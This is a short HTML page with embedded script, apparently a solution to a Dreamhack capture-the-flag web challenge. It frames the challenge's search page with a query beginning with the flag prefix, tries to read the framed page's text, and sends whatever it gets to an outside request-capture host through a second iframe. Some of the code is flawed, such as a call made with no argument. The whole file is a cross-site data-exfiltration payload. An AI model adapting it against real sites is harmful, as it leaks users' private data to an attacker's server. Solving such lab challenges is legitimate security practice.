  <script>
    const afterLoad = function(el) {
          const iframe = document.createElement("iframe")
          let text = "";
          try {
              text = el.contentWindow.document.getElementsByTagName("pre").textContent 
          } catch (error) {
              text = "NoNo"
          }
          iframe.src = `https://mbfjcpx.request.dreamhack.games/` + text
          document.body.append(iframe)
      }
    afterLoad()
  </script>
<html>
  <body>

      <iframe src="http://host8.dreamhack.games:9098/search?query=DH{" id="query" onerror="afterLoad(this)" onload="afterLoad(this)"></iframe>
  </body>

</html>
